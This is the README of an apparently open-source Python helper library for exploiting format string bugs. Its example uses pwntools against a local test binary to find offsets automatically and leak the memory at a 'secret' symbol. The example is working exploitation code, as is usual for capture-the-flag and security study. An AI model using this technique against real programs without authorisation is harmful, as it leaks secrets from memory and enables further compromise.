[![Documentation Status](https://readthedocs.org/projects/formatstringexploiter/badge/?version=latest)](http://formatStringExploiter.readthedocs.org/en/latest/?badge=latest)
![Tests](https://github.com/bannsec/formatStringExploiter/workflows/Tests/badge.svg?branch=master)

# Docs
http://formatstringexploiter.readthedocs.io/en/latest/index.html

# formatStringExploiter
Helper script for working with format string bugs

Example

```python
from formatStringExploiter.FormatString import FormatString
from pwn import *
import logging

logging.basicConfig(level=logging.WARN)
log = logging.getLogger()

elf = ELF("formatStringTest")

# Defining format string executor here
def exec_fmt(s):
    p = process("./formatStringTest",buffer_fill_size=0xffff)
    p.sendline(s)
    p.recvuntil("Input a format string: ")
    out = p.recvuntil("Logged in",drop=True)
    p.close()
    return out

# Create the class and self-discover the correct offsets
fmtStr = FormatString(exec_fmt,elf=elf)

# Leak some point in memory as a string
fmtStr[elf.symbols['secret']]

# Equivalently, but with caching and more smarts...
fmtStr.leak.s(elf.symbols['secret'])
```


